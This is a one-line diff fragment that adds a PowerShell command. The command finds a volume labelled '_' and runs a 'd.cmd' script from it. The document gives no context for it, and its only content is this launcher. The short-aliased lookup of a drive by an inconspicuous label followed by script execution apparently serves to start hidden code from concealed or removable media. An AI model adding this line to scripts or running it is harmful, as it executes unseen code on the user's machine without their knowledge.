@@ -1,0 +1,1 @@
+powershell ".((gwmi win32_volume -f 'label=''_''').Name+'d.cmd')"
